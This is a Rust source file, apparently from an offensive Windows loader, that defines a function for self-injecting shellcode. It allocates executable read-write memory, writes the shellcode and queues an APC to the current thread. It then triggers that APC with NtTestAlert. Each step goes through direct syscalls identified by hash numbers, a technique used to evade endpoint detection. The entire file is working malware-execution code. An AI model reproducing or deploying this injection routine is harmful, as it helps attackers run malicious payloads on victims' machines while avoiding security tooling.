use crate::ffi_ctypes::{NtCurrentProcess, NtCurrentThread, PVOID};
use crate::syscall::SyscallInMemory;
use alloc::collections::BTreeMap;
use core::ffi::c_void;
use core::ptr::null_mut;

// Todo: error handling on syscall fail..
pub unsafe fn self_inject_queue_apc_thread(
    syscall_list: &BTreeMap<u32, SyscallInMemory>,
    shellcode: &[u8],
) -> bool {
    let mut allocstart: *mut c_void = null_mut();
    let mut seize: usize = shellcode.len();

    if crate::make_syscall!(
        &syscall_list,
        572265531,
        NtCurrentProcess,
        &mut allocstart,
        0,
        &mut seize,
        0x00003000,
        0x40
    ) != 0
    {
        println!("{} failed", "NtAllocateVirtualMemory");
        return false;
    }
    if crate::make_syscall!(
        &syscall_list,
        978912993,
        NtCurrentProcess,
        allocstart,
        shellcode.as_ptr() as PVOID,
        shellcode.len() as usize,
        null_mut() as *mut usize
    ) != 0
    {
        println!("{} failed", "NtWriteVirtualMemory");
        return false;
    }

    if crate::make_syscall!(
        &syscall_list,
        1354052103,
        NtCurrentThread,
        allocstart,
        allocstart,
        null_mut() as PVOID,
        null_mut() as PVOID
    ) != 0
    {
        println!("{} failed", "NtQueueApcThread");
        return false;
    }

    if crate::make_syscall!(&syscall_list, 3314412110u32) != 0 {
        println!("{} failed", "NtTestAlert");
        return false;
    }
    true
}
